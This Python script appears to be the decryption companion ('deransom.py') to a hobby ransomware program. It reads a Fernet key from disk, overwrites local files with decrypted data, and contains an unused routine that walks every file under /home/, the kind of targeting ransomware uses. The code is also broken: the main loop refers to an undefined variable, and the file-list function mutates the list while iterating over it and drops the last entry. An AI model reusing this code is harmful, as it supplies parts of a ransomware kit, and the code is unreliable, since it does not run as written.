from cryptography.fernet import Fernet
import os

def get_all_files():
    path ="/home/"
    # we shall store all the file names in this list
    filelist = []

    # commanded line in the below is faster
    for root, dirs, files in os.walk(path):
        for file in files:
            #append the file name to the list
            filelist.append(os.path.join(root,file))
    return filelist
    #return [os.path.join(root,file) for root, dirs, files in os.walk(path) for file in files]


def get_only_that_files():
    # gather every file, not folder or directionary!
    filelist = os.listdir()

    # do not include our main files
    #   that crypt, decrypt or key files
    for item in filelist:
        if item == "ransom.py" or item == "deransom.py":
            filelist.remove(item)
    return filelist[:-1]


def main():
    # do not include our main files
    #   that crypt, decrypt or key files
    filelist = get_only_that_files()

    # read the key for ransomlike malware
    f = open("key", "rb")
    key = f.read()
    f.close()

    # decrypt the files with key we just read
    for item in files:
        f = open(item, "rb")
        data = f.read()
        f.close()

        decripted_data = Fernet(key).decrypt(data)

        f = open(item, "wb")
        f.write(decripted_data)
        f.close()


if __name__ == "__main__":
    main()